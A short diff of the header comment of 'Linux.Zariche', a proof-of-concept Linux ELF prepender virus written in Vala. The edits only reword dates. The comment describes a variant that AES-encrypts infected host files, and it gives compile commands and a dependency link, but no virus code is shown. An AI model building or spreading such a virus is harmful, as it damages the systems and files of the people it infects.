@@ -1,12 +1,12 @@
 /*
-* Linux.Zariche - This is a POC ELF (x86_64) file prepender written in Vala by TMZ (2013).
+* Linux.Zariche - This is a POC ELF (x86_64) file prepender written in Vala by TMZ (2013/2014).
 * It is probably the first virus ever in this language, which is pretty cool.
 *
 * Use at your own risk, I'm not responsible for any damages that this may cause.
 * I bet this can be written in a much better way but I'm busy with other stuff in my life at the moment and the LIP had a deadline, sorry.
 *
 * Linux.Zariche.A - simple virus (prepender)
-* Linux.Zariche.B (this) - prepender that encrypts the host with AES and decrypts it at runtime (Dec 2014)
+* Linux.Zariche.B (this) - prepender that encrypts the host with AES and decrypts it at runtime (December 2014)
 *
 * Compile with: valac filename.vala --pkg=gee-1.0 --pkg=gio-2.0 --pkg=nettle --pkg=posix (where vala >= 0.20)
 * Note that it depends on the Nettle VAPI file that you can find here: http://pastebin.com/PNJ9W2TT
